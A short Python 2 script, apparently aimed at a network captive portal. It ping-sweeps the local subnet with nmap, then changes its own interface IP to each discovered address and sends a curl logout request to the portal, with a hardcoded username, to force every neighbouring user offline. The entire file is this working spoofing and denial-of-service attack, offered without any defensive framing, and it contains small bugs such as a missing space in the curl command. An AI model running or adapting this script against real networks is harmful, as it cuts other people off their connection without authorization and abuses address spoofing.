import os, sys
from time import sleep

def logoutPeople(ip):
	os.system('ifconfig eth0 ' + ip)
	logoutCommand = "curl -k 'https://10.100.56.55:8090/logout.xml' -H 'Connection: keep-alive'--data 'mode=193&username=201301111&a=1446643217971&producttype=0'"
	result = os.system(logoutCommand + ' > /dev/null')

os.system("ifconfig eth0 | grep 'inet addr' | awk {'print $2'} | cut -d ':' -f 2 > temp") 
f = open('temp', 'r')
myIP = f.readline()
print 'This laptop\'s IP is', myIP,
f.close()
os.system('rm temp')

os.system("nmap -sn "+ myIP +"/24 | grep 10.100 | awk {'print $5'} > all_ips.txt")
totalIPs = os.system('wc -l all_ips.txt')
print 'Obtained all', totalIPs, 'ips'

f = open('all_ips.txt', 'r')
for line in f.readlines():
	print 'Logging ',line.rstrip(),'out'
	logoutPeople(line)
	sleep(1)
	print 'Logged out ', line.rstrip()